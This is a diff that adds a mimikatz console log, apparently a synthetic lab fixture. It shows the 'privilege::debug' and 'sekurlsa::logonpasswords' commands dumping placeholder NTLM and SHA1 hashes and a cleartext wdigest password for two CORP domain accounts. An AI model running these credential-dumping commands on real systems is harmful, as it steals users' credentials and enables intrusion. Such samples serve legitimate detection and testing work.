@@ -1,0 +1,64 @@
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com   ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 996359 (00000000:000f3407)
+Session           : Interactive from 2
+User Name         : jdoe
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 7/29/2026 10:15:22 AM
+SID               : S-1-5-21-1111111111-2222222222-3333333333-1105
+        msv :
+         [00000003] Primary
+         * Username : jdoe
+         * Domain   : CORP
+         * NTLM     : 0123456789abcdef0123456789abcdef
+         * SHA1     : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+        tspkg :
+         * Username : jdoe
+         * Domain   : CORP
+         * Password : (null)
+        wdigest :
+         * Username : jdoe
+         * Domain   : CORP
+         * Password : Lab-Wdigest-Pass1!
+        kerberos :
+         * Username : jdoe
+         * Domain   : CORP.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 762421 (00000000:000ba175)
+Session           : Service from 0
+User Name         : svc-backup
+Domain            : CORP
+Logon Server      : DC01
+Logon Time        : 7/29/2026 10:16:03 AM
+SID               : S-1-5-21-1111111111-2222222222-3333333333-2201
+        msv :
+         [00000003] Primary
+         * Username : svc-backup
+         * Domain   : CORP
+         * NTLM     : fedcba9876543210fedcba9876543210
+         * SHA1     : bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+        wdigest :
+         * Username : svc-backup
+         * Domain   : CORP
+         * Password : (null)
+        kerberos :
+         * Username : svc-backup
+         * Domain   : CORP.LOCAL
+         * Password : (null)
+
+mimikatz(commandline) # exit
+Bye!
